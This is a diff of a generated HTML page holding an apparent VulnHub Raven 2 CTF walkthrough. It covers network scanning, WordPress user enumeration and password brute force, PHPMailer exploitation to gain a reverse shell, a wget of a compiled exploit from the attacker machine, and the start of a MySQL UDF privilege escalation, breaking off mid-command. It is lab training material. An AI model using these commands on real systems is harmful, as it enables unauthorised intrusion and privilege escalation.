@@ -683,6 +683,8 @@
       
         
       
+        
+      
     
     
     
@@ -765,6 +767,27 @@
   
   <span class="md-ellipsis">
     ADB
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adidnsdump/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    adidnsdump
   </span>
   
 
@@ -17362,26 +17385,26 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <li>eth0 interface.</li>
 </ul>
 <p>After running </p>
-<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>ip<span class="w"> </span>a
-</span></code></pre></div>
+<p><div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a>ip<span class="w"> </span>a
+</span></code></pre></div></td></tr></table></div>
 we know that the attacker's machine IP address is 192.168.56.102/24. </p>
 <h3 id="reconnaissance">Reconnaissance</h3>
 <h4 id="identify-victims-ip">Identify victim's IP</h4>
 <p>To discover the victim's machine IP, we run:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>sudo<span class="w"> </span>netdiscover<span class="w"> </span>-i<span class="w"> </span>eth1<span class="w"> </span>-r<span class="w"> </span><span class="m">192</span>.168.56.102/24
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a>sudo<span class="w"> </span>netdiscover<span class="w"> </span>-i<span class="w"> </span>eth1<span class="w"> </span>-r<span class="w"> </span><span class="m">192</span>.168.56.102/24
+</span></code></pre></div></td></tr></table></div>
 <p>These are the  results:</p>
 <p><img alt="Victim's machine IP" src="../img/raven2-0.png" /></p>
 <p>Usually, victim's IP is the last one listed, in this case 192.168.56.104, BUT as this lab was performed in several days, victim's machine IP will switch eventually to 192.168.56.105. </p>
 <h4 id="scan-victims-surface-attack">Scan victim's surface attack</h4>
 <p>Now we can run a scanner to see which services are running on the victim's machine:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-p-<span class="w"> </span>-A<span class="w"> </span><span class="m">192</span>.168.56.104
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-p-<span class="w"> </span>-A<span class="w"> </span><span class="m">192</span>.168.56.104
+</span></code></pre></div></td></tr></table></div>
 <p>And the results:</p>
 <p><img alt="Victim's machine ports" src="../img/raven2-1.png" /></p>
 <p>Having a web server in port 80, it's inevitable to open a browser and have a look at it. Also, at the same time, we can run a simple enumeration scan with <a href="../dirb/">dirb</a>:</p>
-<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>dirb<span class="w"> </span>http://192.168.56.104
-</span></code></pre></div>
+<p><div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a>dirb<span class="w"> </span>http://192.168.56.104
+</span></code></pre></div></td></tr></table></div>
 By default, dirb is using /usr/share/dirb/wordlists/common.txt. The results are pretty straightforward:</p>
 <p><img alt="Victim's directory scanner with dirb" src="../img/raven2-2.png" /></p>
 <p>There are two folders quite appealing: </p>
@@ -17391,8 +17414,8 @@ By default, dirb is using /usr/share/dirb/wordlists/common.txt. The results are 
 </ul>
 <h4 id="deeper-scan-with-specific-tool-for-wordpress-service-wpscan">Deeper scan with specific tool for wordpress service: wpscan</h4>
 <p>First, let's start by running a much deeper scanner with <a href="../wpscan/">wpscan</a>. We'll be enumerating users, </p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>wpscan<span class="w"> </span>--url<span class="w"> </span>http://192.168.56.104/wordpress<span class="w"> </span>--enumerate<span class="w"> </span>u<span class="w"> </span>--force<span class="w"> </span>--wp-content-dir<span class="w"> </span>wp-content
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a>wpscan<span class="w"> </span>--url<span class="w"> </span>http://192.168.56.104/wordpress<span class="w"> </span>--enumerate<span class="w"> </span>u<span class="w"> </span>--force<span class="w"> </span>--wp-content-dir<span class="w"> </span>wp-content
+</span></code></pre></div></td></tr></table></div>
 <p>And the results show us some interesting findings:</p>
 <p><img alt="Wpscan results" src="../img/raven2-3.png" /></p>
 <p><img alt="Wpscan results" src="../img/raven2-4.png" /></p>
@@ -17406,12 +17429,13 @@ By default, dirb is using /usr/share/dirb/wordlists/common.txt. The results are 
 <li>Enumerating Users: michael, steven.</li>
 </ul>
 <p>Opening the browser in http://192.168.56.104/wordpress/readme.html, we can see some instructions to set up the wordpress installation. As a matter of fact, by clicking on http://192.168.56.105/wp-admin/install.php, we end up on a webpage with the source code pointing to raven.local. We need to include a redirection in our /etc/hosts file. (This is better explained in <a href="../vulnhub-raven-1/">the vulnhub raven 1 machine</a>.  </p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>sudo<span class="w"> </span>nano<span class="w"> </span>/etc/hosts
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a>sudo<span class="w"> </span>nano<span class="w"> </span>/etc/hosts
+</span></code></pre></div></td></tr></table></div>
 <p>At the  end of the file we add the following line:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="m">192</span>.168.56.104<span class="w">  </span>local.raven
-</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="c1"># CTRL-s  and CTRL-x</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span>
+<span class="normal"><a href="#__codelineno-6-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a><span class="m">192</span>.168.56.104<span class="w">  </span>local.raven
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2"></a><span class="c1"># CTRL-s  and CTRL-x</span>
+</span></code></pre></div></td></tr></table></div>
 <p>There was another open folder: http://raven.local/wordpress/wp-content/uploads/. Using the browser we can get to </p>
 <p><img alt="Browsing an open listed folder" src="../img/raven2-5.png" /></p>
 <p>And now we have flag3:</p>
@@ -17421,11 +17445,11 @@ By default, dirb is using /usr/share/dirb/wordlists/common.txt. The results are 
 <h4 id="bruce-forcing-passwords-for-the-cms">Bruce-forcing passwords for the CMS</h4>
 <p>Having found anything, after testing input validations in the endpoints of the application, </p>
 <p>I'm going to try to brute force login with steven, who is the user with id=2.</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>wpscan<span class="w"> </span>--url<span class="w"> </span>http://192.168.56.105/wordpress<span class="w"> </span>--passwords<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w">  </span>--usernames<span class="w"> </span>steven<span class="w"> </span>-t<span class="w"> </span><span class="m">25</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1"></a>wpscan<span class="w"> </span>--url<span class="w"> </span>http://192.168.56.105/wordpress<span class="w"> </span>--passwords<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w">  </span>--usernames<span class="w"> </span>steven<span class="w"> </span>-t<span class="w"> </span><span class="m">25</span>
+</span></code></pre></div></td></tr></table></div>
 <p>And also with michael:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>wpscan<span class="w"> </span>--url<span class="w"> </span>http://192.168.56.105/wordpress<span class="w"> </span>--passwords<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>--usernames<span class="w"> </span>michael<span class="w"> </span>-t<span class="w"> </span><span class="m">25</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a>wpscan<span class="w"> </span>--url<span class="w"> </span>http://192.168.56.105/wordpress<span class="w"> </span>--passwords<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>--usernames<span class="w"> </span>michael<span class="w"> </span>-t<span class="w"> </span><span class="m">25</span>
+</span></code></pre></div></td></tr></table></div>
 <p>No valid password is found.</p>
 <h4 id="browse-listable-folders-that-are-supposed-to-be-close">Browse listable folders that are supposed to be close</h4>
 <p>Besides the wordpress installation, our dirb scan gave us another interesting folder: http://192.168.56.105/vendor. Browsing around you can find the service PHPMailer installed.</p>
@@ -17434,9 +17458,10 @@ By default, dirb is using /usr/share/dirb/wordlists/common.txt. The results are 
 <p>One is the file PATH, with the the path to the service and other of the flags:</p>
 <p><img alt="flag1" src="../img/raven2-8.png" /></p>
 <p>In plain text:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>/var/www/html/vendor/
-</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>flag1{a2c1f66d2b8051bd3a5874b5b6e43e21}
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1">1</a></span>
+<span class="normal"><a href="#__codelineno-9-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1"></a>/var/www/html/vendor/
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2"></a>flag1{a2c1f66d2b8051bd3a5874b5b6e43e21}
+</span></code></pre></div></td></tr></table></div>
 <p>The second is the file VERSION, that reveals that the PHPMailer service has version 5.2.16, which is potentially vulnerable,.</p>
 <h4 id="exploiting-the-service-phpmailer-5216">Exploiting the service PHPMailer 5.2.16</h4>
 <p>After googling "phpmailer 5.2.16 exploit", we have these results:</p>
@@ -17456,23 +17481,23 @@ To exploit the vulnerability an attacker could target common website components 
 <p>And this is the anarconder.py saved with execution permissions in our attacker machine (hightlighted my changes to the original script):</p>
 <p><img alt="anarconder.py" src="../img/raven2-11.png" /></p>
 <p>We launch the script:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>python3<span class="w"> </span>anarconder.py
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1"></a>python3<span class="w"> </span>anarconder.py
+</span></code></pre></div></td></tr></table></div>
 <p>And open in listening mode port 4444  with netcat:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>nc<span class="w"> </span>-lnvc<span class="w"> </span><span class="m">4444</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1"></a>nc<span class="w"> </span>-lnvc<span class="w"> </span><span class="m">4444</span>
+</span></code></pre></div></td></tr></table></div>
 <p>Now, I will open in the browser http://192.168.56.105/zhell.php to get the reverse shell in my netcat conection.</p>
 <p><img alt="Reverse shell" src="../img/raven2-12.png" /></p>
 <p>And we can browse to /var/www and get flag2.txt</p>
 <p><img alt="Flag2" src="../img/raven2-14.png" /></p>
 <p>flag2.txt in plain text:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>flag2<span class="o">{</span>6a8ed560f0b5358ecf844108048eb337<span class="o">}</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-12-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1"></a>flag2<span class="o">{</span>6a8ed560f0b5358ecf844108048eb337<span class="o">}</span>
+</span></code></pre></div></td></tr></table></div>
 <p>Also, a nice-thing-to-do on every wordpress installation is checking out for credentials in the config file (if existing). So by browsing to /var/www/html/wordpress, we can see:</p>
 <p><img alt="wp-config.php file" src="../img/raven2-15.png" /></p>
 <p>And reading the file, we can see some credentials:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>cat<span class="w"> </span>wp-config.php
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-13-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1"></a>cat<span class="w"> </span>wp-config.php
+</span></code></pre></div></td></tr></table></div>
 <p><img alt="Root credentials" src="../img/raven2-16.png" /></p>
 <p>So now we also have these credentials:</p>
 <ul>
@@ -17484,152 +17509,235 @@ To exploit the vulnerability an attacker could target common website components 
 <p>First, let's see who we are (id), to which groups we belong (id), the version of the running server (uname -a),  and which commands we are allowed to run (sudo -l). </p>
 <p><img alt="Basic reconnaissance" src="../img/raven2-13.png" /></p>
 <p>Also there are some nice tools that we could run in the victim machine if we have python installed. Let's make a comprobation:</p>
-<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>which<span class="w"> </span>python
-</span></code></pre></div>
+<p><div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-14-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1"></a>which<span class="w"> </span>python
+</span></code></pre></div></td></tr></table></div>
 Result:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>/usr/bin/python
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-15-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1"></a>/usr/bin/python
+</span></code></pre></div></td></tr></table></div>
 <p>Nice, let's proceed: There is a cool enumeration tool for linux called <a href="../linux-privilege-checker/">Linux Privilege Cheker</a>, that we can download from the referenced github repo and serve it from our attacker machine:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>cp<span class="w"> </span>linuxprivchecker.py<span class="w"> </span>/var/www/html
-</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="nb">cd</span><span class="w"> </span>/var/www/html
-</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>service<span class="w"> </span>apache2<span class="w"> </span>start
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-16-1">1</a></span>
+<span class="normal"><a href="#__codelineno-16-2">2</a></span>
+<span class="normal"><a href="#__codelineno-16-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1"></a>cp<span class="w"> </span>linuxprivchecker.py<span class="w"> </span>/var/www/html
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2"></a><span class="nb">cd</span><span class="w"> </span>/var/www/html
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3"></a>service<span class="w"> </span>apache2<span class="w"> </span>start
+</span></code></pre></div></td></tr></table></div>
 <p>And then, from the victim machine:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="nb">cd</span><span class="w"> </span>/tmp
-</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>wget<span class="w"> </span>http://192.168.56.102/linuxprivchecker.py
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-17-1">1</a></span>
+<span class="normal"><a href="#__codelineno-17-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1"></a><span class="nb">cd</span><span class="w"> </span>/tmp
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2"></a>wget<span class="w"> </span>http://192.168.56.102/linuxprivchecker.py
+</span></code></pre></div></td></tr></table></div>
 <p>Now we can run it and see the results:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>python<span class="w"> </span>/tmp/linuxprivchecker.py
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-18-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1"></a>python<span class="w"> </span>/tmp/linuxprivchecker.py
+</span></code></pre></div></td></tr></table></div>
 <p>Once you run it, you will get this enumeration of escalation exploits. Since potentially we have some root credentials for a service, we will try with the MYSQL vulnerability 4.X/5.0. </p>
 <p><img alt="Escalation of privileges enumeration" src="../img/raven2-17.png" /></p>
 <p>After reviewing the exploit <a href="http://www.exploit-db.com/exploits/1518">http://www.exploit-db.com/exploits/1518</a>, we copy-paste the exploit and save it as 1518.c in our apache server:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="nb">cd</span><span class="w"> </span>/var/www/html/
-</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>vi<span class="w"> </span><span class="m">1518</span>.c
-</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a><span class="c1"># and we copy paste the exploit</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-19-1">1</a></span>
+<span class="normal"><a href="#__codelineno-19-2">2</a></span>
+<span class="normal"><a href="#__codelineno-19-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1"></a><span class="nb">cd</span><span class="w"> </span>/var/www/html/
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2"></a>vi<span class="w"> </span><span class="m">1518</span>.c
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3"></a><span class="c1"># and we copy paste the exploit</span>
+</span></code></pre></div></td></tr></table></div>
 <p>Compiling this C code in the victim attack gives us error.</p>
 <p><img alt="Error when compiling" src="../img/raven2-18.png" /> </p>
 <p>Then, we are going to compile in the attacker machine.</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="c1"># To creates 1518.o from 1518.c</span>
-</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>sudo<span class="w"> </span>gcc<span class="w"> </span>-g<span class="w"> </span>-c<span class="w"> </span><span class="m">1518</span>.c
-</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>
-</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a><span class="c1"># To create 1518.so from both 1518.c and 1518.o</span>
-</span><span id="__span-20-5"><a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a>sudo<span class="w"> </span>gcc<span class="w"> </span>-g<span class="w"> </span>-shared<span class="w"> </span>-Wl,-soname,1518.so<span class="w"> </span>-o<span class="w"> </span><span class="m">1518</span>.so<span class="w"> </span><span class="m">1518</span>.o<span class="w"> </span>-lc<span class="w"> </span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-20-1">1</a></span>
+<span class="normal"><a href="#__codelineno-20-2">2</a></span>
+<span class="normal"><a href="#__codelineno-20-3">3</a></span>
+<span class="normal"><a href="#__codelineno-20-4">4</a></span>
+<span class="normal"><a href="#__codelineno-20-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1"></a><span class="c1"># To creates 1518.o from 1518.c</span>
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2"></a>sudo<span class="w"> </span>gcc<span class="w"> </span>-g<span class="w"> </span>-c<span class="w"> </span><span class="m">1518</span>.c
+</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3"></a>
+</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4"></a><span class="c1"># To create 1518.so from both 1518.c and 1518.o</span>
+</span><span id="__span-20-5"><a id="__codelineno-20-5" name="__codelineno-20-5"></a>sudo<span class="w"> </span>gcc<span class="w"> </span>-g<span class="w"> </span>-shared<span class="w"> </span>-Wl,-soname,1518.so<span class="w"> </span>-o<span class="w"> </span><span class="m">1518</span>.so<span class="w"> </span><span class="m">1518</span>.o<span class="w"> </span>-lc<span class="w"> </span>
+</span></code></pre></div></td></tr></table></div>
 <p>The file we are going to retrieve from the victim machine is 1518.so. So from /tmp in the victim machine:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="nb">cd</span><span class="w"> </span>/tmp
-</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>wget<span class="w"> </span>http://192.168.56.102/1518.so
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-21-1">1</a></span>
+<span class="normal"><a href="#__codelineno-21-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1"></a><span class="nb">cd</span><span class="w"> </span>/tmp
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2"></a>wget<span class="w"> </span>http://192.168.56.102/1518.so
+</span></code></pre></div></td></tr></table></div>
 <p>Now in the victim machine, we login into MSQL service:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>mysql<span class="w"> </span>-u<span class="w"> </span>root<span class="w"> </span>-p
-</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>
-</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a><span class="c1"># when asked about password, we enter R@v3nSecurity</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-22-1">1</a></span>
+<span class="normal"><a href="#__codelineno-22-2">2</a></span>
+<span class="normal"><a href="#__codelineno-22-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1"></a>mysql<span class="w"> </span>-u<span class="w"> </span>root<span class="w"> </span>-p
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2"></a>
+</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3"></a><span class="c1"># when asked about password, we enter R@v3nSecurity</span>
+</span></code></pre></div></td></tr></table></div>
 <p>We're in! Let's do some digging:</p>
-<div class="language-mysql highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="c1"># List databases</span>
-</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="k">SHOW</span><span class="w"> </span><span class="k">databases</span><span class="p">;</span>
-</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>
-</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a><span class="c1"># Select a database</span>
-</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a><span class="k">use</span><span class="w"> </span><span class="n">mysql</span><span class="p">;</span>
-</span></code></pre></div>
+<div class="language-mysql highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-23-1">1</a></span>
+<span class="normal"><a href="#__codelineno-23-2">2</a></span>
+<span class="normal"><a href="#__codelineno-23-3">3</a></span>
+<span class="normal"><a href="#__codelineno-23-4">4</a></span>
+<span class="normal"><a href="#__codelineno-23-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1"></a><span class="c1"># List databases</span>
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2"></a><span class="k">SHOW</span><span class="w"> </span><span class="k">databases</span><span class="p">;</span>
+</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3"></a>
+</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4"></a><span class="c1"># Select a database</span>
+</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5"></a><span class="k">use</span><span class="w"> </span><span class="n">mysql</span><span class="p">;</span>
+</span></code></pre></div></td></tr></table></div>
 <p>Exploiting the vulnerability: we'll create a table in the database, with a column, and we will assing a value to that column that it's going to be our payload file with the extension .so.</p>
-<div class="language-mysql highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="k">create</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">foo</span><span class="p">(</span><span class="n">line</span><span class="w"> </span><span class="kt">blob</span><span class="p">);</span>
